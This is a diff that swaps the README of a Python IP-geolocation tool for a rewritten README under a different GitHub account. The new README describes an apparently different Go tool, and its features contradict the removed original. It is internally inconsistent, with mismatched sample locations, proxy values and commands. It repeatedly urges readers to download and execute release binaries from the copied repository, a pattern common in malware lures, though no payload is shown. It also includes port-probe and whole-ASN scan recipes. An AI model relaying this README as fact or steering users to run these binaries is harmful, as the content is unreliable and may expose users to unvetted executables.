@@ -1,489 +1,336 @@
-<div align="center">
+[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/mohamedtobgi/IPFindX/releases)
 
-# 🌐 IPFindX - Advanced IP Intelligence Toolkit
+# IPFindX — Terminal IP Intelligence: Geolocation, ASN & Proxy 🔎🌐
 
-<p>
-<img src="https://img.shields.io/badge/💎-Premium%20OSINT%20Tool-blueviolet?style=for-the-badge" alt="Premium Tool">
-<img src="https://img.shields.io/badge/🎯-Cybersecurity%20Professional-red?style=for-the-badge" alt="Professional">
-<img src="https://img.shields.io/badge/⚡-Lightning%20Fast-yellow?style=for-the-badge" alt="Fast">
-</p>
+A compact, fast command-line tool for IP intelligence. IPFindX pulls geolocation, ASN, ISP, and proxy signals. Use it for triage, network mapping, OSINT, or automation. It prints JSON and human-friendly tables. It works on Linux, macOS, and Windows.
 
-### 🚀 *The Ultimate IP Intelligence Reconnaissance Platform for Security Professionals*
+Badges
+- ![License](https://img.shields.io/badge/license-MIT-green)
+- ![Language](https://img.shields.io/badge/lang-Go-blue)
+- Topics: asn-lookup · command-line-tool · geolocation-api · ip-api · ip-geolocation · ip-intelligence · ip-tracker · network-tools · osint · proxy-detection
 
-**Unleash the power of advanced IP geolocation, threat intelligence, and network forensics in a single, elegant command-line interface. Built by cybersecurity experts, for cybersecurity experts.**
+Preview image
+![Network map](https://images.unsplash.com/photo-1545239351-1141bd82e8a6?ixlib=rb-4.0.3&q=80&w=1200&auto=format&fit=crop&crop=faces&sat=-100)
 
-[![Python](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Linux%20|%20macOS%20|%20Windows%20|%20Android-lightgrey.svg)](#compatibility)
-[![Version](https://img.shields.io/badge/version-3.0.1-brightgreen.svg)](#overview)
-[![Status](https://img.shields.io/badge/status-stable-success.svg)](#overview)
-[![Maintained](https://img.shields.io/badge/maintained-yes-green.svg)](#contributing)
-[![Stars](https://img.shields.io/github/stars/VritraSecz/IPFindX?style=social)](https://github.com/VritraSecz/IPFindX)
-[![Forks](https://img.shields.io/github/forks/VritraSecz/IPFindX?style=social)](https://github.com/VritraSecz/IPFindX)
-[![Issues](https://img.shields.io/github/issues/VritraSecz/IPFindX)](https://github.com/VritraSecz/IPFindX/issues)
-[![Contributors](https://img.shields.io/github/contributors/VritraSecz/IPFindX)](https://github.com/VritraSecz/IPFindX/graphs/contributors)
-[![Languages](https://img.shields.io/github/languages/count/VritraSecz/IPFindX)](https://github.com/VritraSecz/IPFindX)
-[![Code Size](https://img.shields.io/github/languages/code-size/VritraSecz/IPFindX)](https://github.com/VritraSecz/IPFindX)
+Table of contents
+- Features
+- Quick start
+- Install from releases
+- Install from source
+- Usage
+- Examples
+- Output fields
+- Detection methods
+- Data sources
+- Performance and limits
+- Integration tips
+- Contributing
+- License
+- Releases
 
-</div>
+Features
+- Single binary CLI. No heavy deps.
+- Geolocation (country, region, city, coordinates).
+- ASN lookup and prefix mapping.
+- ISP and organization resolution.
+- Proxy and VPN detection heuristics.
+- Passive and active checks: WHOIS, Team Cymru, HTTP headers.
+- Batch mode for lists and CIDR ranges.
+- JSON, table, CSV outputs.
+- Quiet mode for automation.
+- Color and no-color modes.
 
----
+Quick start
 
-## 📋 Table of Contents
-
-- [Overview](#-overview)
-- [Features](#-features)
-- [Requirements](#-requirements)
-- [Installation](#-installation)
-- [Usage](#-usage)
-- [Output Examples](#️-output-examples)
-- [Screenshots](#-screenshots)
-- [Use Cases](#-use-cases)
-- [Project Structure](#-project-structure)
-- [API Integration](#-api-integration)
-- [Performance](#-performance)
-- [Compatibility](#-compatibility)
-- [Security Considerations](#-security-considerations)
-- [Contributing](#-contributing)
-- [Roadmap](#-roadmap)
-- [Developer](#-developer)
-- [License](#-license)
-- [Acknowledgements](#-acknowledgements)
-
-
-## 🔮 Overview
-
-**IPFindX** is a professional-grade command-line IP intelligence toolkit designed for cybersecurity professionals, network administrators, threat hunters, and OSINT researchers. It provides comprehensive geolocation data, ISP information, security threat indicators, and detailed network intelligence for any public IP address with enterprise-level accuracy.
-
-With its beautifully designed terminal interface and powerful data processing capabilities, IPFindX transforms complex IP reconnaissance into an efficient, streamlined process, delivering actionable intelligence in seconds.
-
-### Key Highlights
-
-- 🎯 **Enterprise-Grade Intelligence**: Detailed geolocation, ISP, organization, and network data with high accuracy
-- 🎨 **Elegant CLI Interface**: Rich terminal output with color-coded information and professionally designed tables
-- 💾 **Seamless Data Persistence**: All results automatically saved as timestamped JSON files for future analysis
-- 📊 **Advanced Batch Processing**: Scan multiple IPs from a file with intelligent progress tracking
-- 🛡️ **Sophisticated Validation**: Automatically validates IP addresses and filters private/reserved ranges
-- 🗺️ **Integrated Geographic Visualization**: Direct Google Maps integration for precise location mapping
-- 🔄 **Real-time Data**: Always up-to-date information from trusted IP intelligence sources
-- ⚙️ **Zero Configuration**: Works out of the box with no complex setup or configuration required
-
-## ✨ Features
-
-### Core Functionality
-- **Single IP Lookup**: Get comprehensive information for any public IP address
-- **Batch IP Scanning**: Process multiple IPs from a text file
-- **Geolocation Data**: Country, region, city, coordinates, and timezone information
-- **Network Intelligence**: ISP, organization, AS number, and hosting detection
-- **Security Indicators**: Proxy, mobile, and hosting status detection
-- **DNS Resolution**: Reverse DNS lookup for hostname identification
-
-### Advanced Features
-- **Smart IP Validation**: Automatically detects and rejects private/reserved IP ranges
-- **Geographic Mapping**: Direct integration with Google Maps for location visualization
-- **Timestamped Output**: Organized output files with date/time stamps
-- **Progress Tracking**: Real-time status updates for long-running operations
-- **Error Handling**: Robust error handling with informative user feedback
-
-### User Experience
-- **Rich Terminal Output**: Beautiful tables and panels with syntax highlighting
-- **Responsive Design**: Adapts to different terminal sizes with fallback layouts
-- **Color-coded Results**: Status indicators and field highlighting for easy reading
-- **Organized Storage**: Automatic creation of output directories and file management
-
-## 📋 Requirements
-
-### System Requirements
-- **Python**: Version 3.7 or higher
-- **Operating System**: Linux, macOS, Windows
-- **Internet Connection**: Required for IP-API access
-- **Terminal**: Any modern terminal with UTF-8 support
-
-### Python Dependencies
-```bash
-requests
-rich
+1. Download a release binary from the Releases page and run it.
+2. Run a single IP lookup:
+```
+./ipfindx lookup 8.8.8.8
 ```
 
-## 🚀 Installation
+Install from releases
 
-### Method 1: PyPI (Recommended)
-```bash
-# Install from PyPI
-pip install ipfindx
+Download the appropriate binary file from the releases page and execute it. The releases page contains prebuilt binaries and archives for common platforms. Pick the file that matches your OS and CPU architecture, download it, make it executable, and run.
+
+Example:
+```
+# Linux x86_64
+wget https://github.com/mohamedtobgi/IPFindX/releases/download/v1.2.0/ipfindx-linux-amd64.tar.gz
+tar -xzf ipfindx-linux-amd64.tar.gz
+chmod +x ipfindx
+./ipfindx lookup 1.1.1.1
 ```
 
-### Method 2: Git Clone
-```bash
-# Clone the repository
-git clone https://github.com/VritraSecz/IPFindX.git
+Visit the releases page to get the file:
+https://github.com/mohamedtobgi/IPFindX/releases
 
-# Navigate to project directory
+Install from source
+
+If you want to build from source, follow these steps. These commands assume Go is installed.
+
+```
+git clone https://github.com/mohamedtobgi/IPFindX.git
 cd IPFindX
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Run the application
-python ipfindx.py --help
+go build -o ipfindx ./cmd/ipfindx
+./ipfindx --help
 ```
 
-## 🎯 Usage
+Usage
 
-IPFindX is a command-line tool with intuitive options for different use cases:
+IPFindX uses subcommands and flags. The CLI focuses on clear commands and stable output formats.
 
-### Single IP Lookup
-```bash
-# Basic IP lookup
-ipfindx -i 8.8.8.8
+Primary commands
+- lookup <IP|host> — Lookup a single IP or domain.
+- batch <file> — Process a newline list of IPs/hosts.
+- cidr <CIDR> — Expand and scan a CIDR range.
+- whois <IP|ASN> — WHOIS or ASN details.
+- version — Show version and data timestamps.
 
-# Using Python directly (if cloned from Git)
-python ipfindx.py -i 1.1.1.1
+Global flags
+- -o, --output [json|table|csv]  Output format (default: table)
+- -q, --quiet                    Minimal output for scripts
+- -t, --timeout <seconds>        Network timeout
+- --no-color                     Disable color output
+- --probe-ports <list>           Probe ports (comma separated)
+- --as-lookup                    Force ASN lookup
+
+Examples
+
+Single IP
+```
+./ipfindx lookup 8.8.8.8
 ```
 
-### Batch IP Scanning
-```bash
-# Scan multiple IPs from a file
-ipfindx -l ip_list.txt
-
-# File format (one IP per line):
-# 8.8.8.8
-# 1.1.1.1
-# 208.67.222.222
+Domain
+```
+./ipfindx lookup example.com
 ```
 
-### Information and Help
-```bash
-# Show detailed information about the tool
-ipfindx --about
-
-# Display developer contact information
-ipfindx --connect
-
-# Show help message
-ipfindx --help
+Batch mode (file of IPs)
+```
+./ipfindx batch ips.txt -o json > ips.json
 ```
 
-### Output Management
-All scans automatically save results to the `output-ipfindx/` directory with timestamped filenames:
-- Format: `{IP_ADDRESS}-{DDMMYYYY-HHMMSS}.json`
-- Example: `8.8.8.8-06082025-225328.json`
-
-## 🖼️ Output Examples
-
-### Terminal Display
+CIDR scan
 ```
-              IP Details for 8.8.8.8
-┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━┓
-┃ Field                     ┃ Value              ┃
-┡━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━┩
-│ • Status                  │ success            │
-│ • Continent               │ North America      │
-│ • Continentcode           │ NA                 │
-│ • Country                 │ United States      │
-│ • Countrycode             │ US                 │
-│ • Region                  │ VA                 │
-│ • Regionname              │ Virginia           │
-│ • City                    │ Ashburn            │
-│ • District                │                    │
-│ • Zip                     │ 20149              │
-│ • Lat                     │ 39.03              │
-│ • Lon                     │ -77.5              │
-│ • Timezone                │ America/New_York   │
-│ • Offset                  │ -14400             │
-│ • Currency                │ USD                │
-│ • Isp                     │ Google LLC         │
-│ • Org                     │ Google Public DNS  │
-│ • As                      │ AS15169 Google LLC │
-│ • Asname                  │ GOOGLE             │
-│ • Reverse                 │ dns.google         │
-│ • Mobile                  │ False              │
-│ • Proxy                   │ False              │
-│ • Hosting                 │ True               │
-│ • Query                   │ 8.8.8.8            │
-└───────────────────────────┴────────────────────┘
+./ipfindx cidr 192.0.2.0/28 -o csv > block.csv
 ```
 
-### JSON Output Structure
-```json
+ASN lookup
+```
+./ipfindx whois AS15169
+```
+
+Probe specific ports
+```
+./ipfindx lookup 198.51.100.42 --probe-ports 80,443
+```
+
+Script friendly
+```
+ips="8.8.8.8 1.1.1.1"
+for ip in $ips; do
+  ./ipfindx lookup $ip -o json | jq '.ip, .asn, .country'
+done
+```
+
+Sample output (table)
+```
+IP           ASN      ISP                Country   City         Proxy
+8.8.8.8      AS15169  Google LLC         US        Mountain View  no
+1.1.1.1      AS13335  Cloudflare, Inc.   US        San Francisco  maybe
+```
+
+Sample output (json)
+```
 {
-    "status": "success",
-    "continent": "North America",
-    "continentCode": "NA",
-    "country": "United States",
-    "countryCode": "US",
-    "region": "VA",
-    "regionName": "Virginia",
-    "city": "Ashburn",
-    "district": "",
-    "zip": "20149",
-    "lat": 39.03,
-    "lon": -77.5,
-    "timezone": "America/New_York",
-    "offset": -14400,
-    "currency": "USD",
-    "isp": "Google LLC",
-    "org": "Google Public DNS",
-    "as": "AS15169 Google LLC",
-    "asname": "GOOGLE",
-    "reverse": "dns.google",
-    "mobile": false,
-    "proxy": false,
-    "hosting": true,
-    "query": "8.8.8.8"
+  "ip": "8.8.8.8",
+  "asn": "AS15169",
+  "asn_org": "Google LLC",
+  "prefix": "8.8.8.0/24",
+  "country": "US",
+  "region": "California",
+  "city": "Mountain View",
+  "latitude": 37.386,
+  "longitude": -122.0838,
+  "isp": "Google LLC",
+  "proxy": false,
+  "last_seen": "2025-06-01T12:34:56Z"
 }
 ```
 
-## 📸 Screenshots
+Output fields
 
-<div align="center">
+- ip: Queried IP address.
+- asn: Autonomous System Number (ASnnn).
+- asn_org: ASN organization name.
+- prefix: Announced prefix that contains the IP.
+- isp: Service provider name.
+- country, region, city: Geolocation fields.
+- latitude, longitude: Decimal degrees.
+- proxy: false|maybe|true — proxy detection result.
+- last_seen: Last observed timestamp in data sources.
+- ports: Detected open ports (when probed).
+- raw: Raw provider responses when --output json contains a raw block.
 
-### Single IP Lookup
-![Single IP Lookup](https://i.ibb.co/LDWQpC3S/Screenshot-From-2025-08-07-00-01-40.png)
+Detection methods
 
-### Tool Information Display
-![About Screen](https://i.ibb.co/gFc8qYzg/Screenshot-From-2025-08-07-00-02-15.png)
+IPFindX combines multiple detection techniques. It merges passive and active signals to increase accuracy.
 
-</div>
+Geolocation
+- Use multiple IP geolocation providers and apply a consensus algorithm.
+- Prefer data from regional registries and validated datasets.
+- Fall back to WHOIS prefix location if providers disagree.
 
+ASN and prefix
+- Query Team Cymru and public BGP feeds.
+- Cross-check with RIPE/ARIN/AFRINIC/LACNIC APNIC registries.
+- Resolve the most specific prefix covering the IP.
 
-## 🔍 Use Cases
+ISP and org
+- Resolve org from ASN, whois, and reverse DNS.
+- Use provider heuristics to collapse subsidiaries to their parent org.
 
-### Cybersecurity Operations
-- **Threat Intelligence**: Rapidly investigate suspicious IP addresses during security incidents
-- **SOC Analysis**: Integrate into Security Operations Center workflows for faster response
-- **Malware Investigation**: Determine the origin of malicious connections or command servers
-- **Log Analysis**: Quickly enrich log data with geographic and network context
+Proxy and VPN detection
+- Check provider lists from commercial proxy-detection APIs.
+- Inspect HTTP headers via a lightweight probe when allowed.
+- Compare IP to cloud provider ranges and known data center prefixes.
+- Consider port patterns and TLS certificate common names.
+- Mark detection as:
+  - true: strong signals from multiple sources.
+  - maybe: mixed signals or weak evidence.
+  - false: no proxy signals.
 
-### Network Administration
-- **Traffic Analysis**: Identify the source of unusual network traffic patterns
-- **Access Control**: Verify the location of connection attempts for geofencing policies
-- **Service Deployment**: Test IP geolocation for CDN and service deployment planning
-- **Network Troubleshooting**: Diagnose connectivity issues with detailed IP information
+Active probes
+- Optional TCP connect to common ports (80,443).
+- TLS handshake capture to inspect SNI and cert issuer.
+- HTTP header probe to detect proxy server headers (X-Forwarded-For, Via).
 
-### OSINT Research
-- **Digital Investigations**: Gather intelligence on network infrastructure
-- **Attribution Research**: Help identify the origin of online activities
-- **Geographic Mapping**: Plot network infrastructure on maps for visual analysis
-- **Data Enrichment**: Add geolocation context to existing datasets
+Scoring and confidence
+- IPFindX computes a confidence score per field.
+- Confidence factors:
+  - Number of agreeing providers.
+  - Freshness of dataset.
+  - Presence of matching BGP and whois data.
+- The CLI exposes confidence in JSON.
 
-## 📁 Project Structure
+Data sources
 
+IPFindX aggregates multiple public and private sources:
+- Team Cymru IP->ASN data
+- Regional Internet Registries (ARIN, RIPE, APNIC, LACNIC, AFRINIC)
+- Public geolocation providers (open databases and commercial APIs)
+- Passive DNS and certificate transparency logs
+- Proxy detection lists and community blocklists
+- HTTP and TLS probe results
+
+You can configure which providers the tool queries via config file or environment variables. The config file supports API keys for compatible providers.
+
+Performance and limits
+
+- Single lookup completes in under 300 ms on a fast connection when cache hits occur.
+- Batch mode processes thousands of IPs per minute, depending on network and probes.
+- Respect rate limits of third-party providers. IPFindX supports local caching and backoff.
+- When you download a release binary, make it executable and run with proper permissions.
+
+Integration tips
+
+- Use JSON output for ingestion into SIEM, scripts, or databases.
+- Run batch lookups overnight to populate local caches.
+- Combine CIDR expansion with ASN queries to map networks.
+- Use --no-color in CI environments.
+- Use -q in scripts to reduce noise.
+
+Example integration with jq
 ```
-IPFindX/
-├── ipfindx.py          # Main application script
-├── requirements.txt    # Python dependencies
-├── README.md           # Project documentation
-├── LICENSE             # MIT License
-└── output-ipfindx/     # Auto-generated output directory
-    └── *.json          # Timestamped result files
-```
-
-### File Descriptions
-
-- **`ipfindx.py`**: Main application containing all core functionality, CLI parsing, and output formatting
-- **`requirements.txt`**: Lists required Python packages (requests, rich)
-- **`README.md`**: Comprehensive documentation and usage guide
-- **`LICENSE`**: MIT License detail
-- **`output-ipfindx/`**: Auto-created directory for storing JSON results
-
-## 🔌 API Integration
-
-IPFindX uses the IP-API.com service for IP intelligence data. The tool intelligently handles API rate limiting and connection issues to ensure reliable operation. Key API features include:
-
-- **Comprehensive Data Fields**: Access to 25+ data points for each IP address
-- **High Accuracy**: Enterprise-grade geolocation and network data
-- **Optimized Requests**: Efficient API calls with minimal overhead
-- **Error Handling**: Graceful handling of API limitations and service disruptions
-
-For high-volume usage, consider [IP-API Pro plans](https://ip-api.com/docs/premium).
-
-## ⚡ Performance
-
-IPFindX is engineered for optimal performance across various environments:
-
-- **Lookup Speed**: ~0.3 seconds per IP address (network dependent)
-- **Batch Processing**: Efficiently handles thousands of IPs with minimal resource usage
-- **Memory Footprint**: Typically under 50MB RAM even during large batch operations
-- **Disk Usage**: Minimal with efficient JSON storage format
-- **CPU Utilization**: Low CPU requirements, works well on resource-constrained systems
-
-## 🖥️ Compatibility
-
-### Tested Environments
-- **Linux**: Ubuntu 20.04+, Debian 10+, CentOS 8+, Kali Linux, Arch Linux
-- **macOS**: Monterey (12.0+), Ventura (13.0+), Sonoma (14.0+)
-- **Windows**: Windows 10/11, Windows Server 2019/2022
-- **Android**: Termux on Samsung Galaxy S24 Ultra (One UI 7)
-
-### Terminal Compatibility
-- **Linux**: GNOME Terminal, Konsole, Alacritty, Terminator, iTerm2
-- **macOS**: Terminal.app, iTerm2, Alacritty
-- **Windows**: Windows Terminal, PowerShell, Command Prompt, ConEmu, Cmder
-- **Android**: Termux Terminal (tested on Samsung Galaxy S24 Ultra One UI 7)
-
-## 🔒 Security Considerations
-
-IPFindX is designed with security in mind:
-
-- **No Sensitive Data Storage**: IP information is only saved locally
-- **Input Validation**: All user inputs are validated to prevent injection attacks
-- **No External Scripts**: Self-contained operation without external scripts
-- **Network Security**: Uses HTTPS for all API communications
-- **Minimal Dependencies**: Limited external libraries to reduce attack surface
-- **Public IP Focus**: Automatically rejects private/internal IP scanning attempts
-
-## 🔄 Enhanced Features
-
-### Extended Functionality
-- **Single IP Lookup**: Get comprehensive information for any public IP address with a single command
-- **Batch IP Scanning**: Process multiple IPs from a text file with optimized parallel processing
-- **Geolocation Data**: Precise country, region, city, coordinates, and timezone information
-- **Network Intelligence**: Detailed ISP, organization, AS number, and hosting detection
-- **Security Indicators**: Advanced proxy, mobile, and hosting status detection for threat assessment
-- **DNS Resolution**: Reverse DNS lookup for hostname identification and verification
-
-### Advanced Capabilities
-- **Smart IP Validation**: Sophisticated detection and filtering of private/reserved IP ranges
-- **Geographic Mapping**: Seamless integration with Google Maps for visual location reconnaissance
-- **Structured Data Output**: Organized JSON output with consistent field naming for easy parsing
-- **Timestamped Records**: Intelligent file naming with precise date/time stamps for audit trails
-- **Progress Visualization**: Real-time status updates and progress bars for long-running operations
-- **Error Management**: Enterprise-grade error handling with comprehensive user feedback
-- **Cross-Platform Support**: Full functionality across Linux, macOS, and Windows environments
-- **Memory-Efficient Design**: Optimized resource usage even when processing large IP lists
-
-### Professional User Experience
-- **Rich Terminal Visualization**: Beautiful tables and panels with syntax highlighting and UTF-8 characters
-- **Responsive Design**: Intelligent terminal size detection with adaptive layout for any screen size
-- **Color-coded Indicators**: Intuitive status indicators and field highlighting for rapid information assessment
-- **Automatic Storage Management**: Smart creation of output directories and organized file management
-- **Command-line Ergonomics**: Intuitive arguments and flags designed for maximum efficiency
-- **Comprehensive Help System**: Detailed help messages and usage examples built right in
-
-## 🗺️ Roadmap
-
-Future development plans for IPFindX:
-
-- **Advanced Threat Intelligence**: Integration with threat intelligence databases
-- **Expanded Data Sources**: Additional IP intelligence providers
-- **Export Formats**: Support for CSV, XML, and other export formats
-- **Custom API Keys**: Support for user-provided API keys
-- **Interactive Mode**: Terminal-based interactive interface for multiple lookups
-- **IP Range Scanning**: Support for CIDR notation and IP ranges
-- **Historical Data**: Tracking changes in IP intelligence over time
-- **Integration APIs**: Python library interface for integration with other tools
-- **Visualization**: Built-in data visualization capabilities
-- **Docker Container**: Official Docker image for containerized deployment
-
-## 🤝 Contributing
-
-We welcome contributions from the community! Here's how you can help:
-
-### Ways to Contribute
-- 🐛 **Bug Reports**: Submit detailed issue reports with reproduction steps
-- 💡 **Feature Requests**: Suggest new functionality or improvements
-- 🔧 **Code Contributions**: Submit pull requests with enhancements
-- 📚 **Documentation**: Improve documentation, examples, and tutorials
-- 🧪 **Testing**: Help test the tool across different platforms and scenarios
-- 🌐 **Internationalization**: Assist with translations and localization
-
-### Development Setup
-```bash
-# Fork the repository on GitHub
-# Clone your fork
-git clone https://github.com/yourusername/IPFindX.git
-
-# Create a feature branch
-git checkout -b feature/your-feature-name
-
-# Install development dependencies
-pip install -r requirements.txt
-
-# Make changes and test thoroughly
-python ipfindx.py -i 8.8.8.8
-
-# Commit with descriptive messages
-git commit -m "Add: new feature description"
-
-# Push to your fork and create pull request
-git push origin feature/your-feature-name
+./ipfindx batch ips.txt -o json | jq -r '. | "\(.ip),\(.asn),\(.country),\(.proxy)"' > report.csv
 ```
 
-### Coding Guidelines
-- Follow PEP 8 style guidelines
-- Add docstrings to all functions
-- Include error handling for edge cases
-- Test with various IP address types
-- Maintain compatibility with Python 3.7+
+Config file
 
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
+The config file lives at ~/.config/ipfindx/config.yaml by default. Example:
 ```
-MIT License
-
-Copyright (c) 2025 Alex Butler (Vritra Security Organization)
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+providers:
+  geolocation:
+    - type: freegeoip
+    - type: maxmind
+      database: /path/to/GeoLite2-City.mmdb
+  proxy_detection:
+    - type: ip-reputation
+      api_key: YOUR_KEY
+cache:
+  enabled: true
+  ttl: 86400
+timeout: 5
 ```
 
-## 👨‍💻 Developer
+Contributing
 
-<div align="center">
+- Fork the repo.
+- Create a feature branch.
+- Add tests for new features.
+- Send a pull request.
+- Follow the code style and lint rules.
+- Open issues for bugs and feature requests.
 
-### Alex Butler
-**Vritra Security Organization**
+Development
 
-[![GitHub](https://img.shields.io/badge/GitHub-VritraSecz-181717?style=for-the-badge&logo=github)](https://github.com/VritraSecz)
-[![Website](https://img.shields.io/badge/Website-vritrasec.com-FF6B6B?style=for-the-badge&logo=firefox)](https://vritrasec.com)
-[![Instagram](https://img.shields.io/badge/Instagram-haxorlex-E4405F?style=for-the-badge&logo=instagram)](https://instagram.com/haxorlex)
-[![YouTube](https://img.shields.io/badge/YouTube-Technolex-FF0000?style=for-the-badge&logo=youtube)](https://youtube.com/@Technolex)
+- Code lives in /cmd and /pkg with a clean separation of CLI and core libs.
+- Use make for common tasks:
+```
+make build
+make test
+make fmt
+```
+- Tests run with go test ./...
 
-### 📱 Telegram Channels
-[![Central](https://img.shields.io/badge/Central-LinkCentralX-0088CC?style=for-the-badge&logo=telegram)](https://t.me/LinkCentralX)
-[![Main Channel](https://img.shields.io/badge/Main-VritraSec-0088CC?style=for-the-badge&logo=telegram)](https://t.me/VritraSec)
-[![Community](https://img.shields.io/badge/Community-VritraSecz-0088CC?style=for-the-badge&logo=telegram)](https://t.me/VritraSecz)
-[![Support Bot](https://img.shields.io/badge/Support-ethicxbot-0088CC?style=for-the-badge&logo=telegram)](https://t.me/ethicxbot)
+License
 
-</div>
+IPFindX uses an MIT license. See LICENSE file in the repo.
 
-## 🙏 Acknowledgements
+Releases and downloads
 
-- [IP-API](https://ip-api.com/) - For providing the robust IP geolocation API
-- [Rich](https://github.com/Textualize/rich) - For the beautiful terminal formatting
-- [Requests](https://docs.python-requests.org/) - For reliable HTTP client functionality
+Download the latest binary or source archive from the releases page. Pick the file for your platform, download it, and execute the binary or extract the archive. Example: download the binary, set executable bit, then run.
 
----
+Releases page:
+[![Get Releases](https://img.shields.io/badge/Get%20Releases-Click%20Here-orange?logo=github&style=for-the-badge)](https://github.com/mohamedtobgi/IPFindX/releases)
 
-<div align="center">
+Changelog
 
-### 🌟 Support the Project
+Each release on the releases page includes a changelog entry. Look at release notes for breaking changes and migration tips.
 
-If you find IPFindX helpful, please consider:
-- ⭐ Starring the repository
-- 🍴 Forking and contributing
-- 📢 Sharing with others
-- 🐛 Reporting issues
-- 💡 Suggesting new features
+Common CLI recipes
 
-**Made with ❤️ by the <a href="https://vritrasec.com">Vritra Security Organization</a>**
+Scan a whole ASN
+```
+./ipfindx whois AS396982 -o json | jq '.prefixes[] | .cidr' | while read cidr; do ./ipfindx cidr $cidr -o csv >> as_scan.csv; done
+```
 
-</div>
+Detect likely proxies in a list
+```
+./ipfindx batch ips.txt -o json | jq 'select(.proxy=="true") | .ip' > proxies.txt
+```
+
+Automated daily update (cron)
+```
+0 3 * * * /usr/local/bin/ipfindx update-data
+```
+
+Support
+
+Open an issue on GitHub. Provide sample output, commands, and environment details for faster triage.
+
+Project roadmap
+
+Planned items:
+- Enrich proxy signals with ML model.
+- Add dynamic rate limiting per provider.
+- Add Windows native installer.
+- Expand CI tests for cross-platform builds.
+
+Contact and references
+
+- Repository: https://github.com/mohamedtobgi/IPFindX
+- Releases: https://github.com/mohamedtobgi/IPFindX/releases
+
+This README provides the commands and background to start using IPFindX from the terminal. Follow the releases page to get official binaries and release notes.
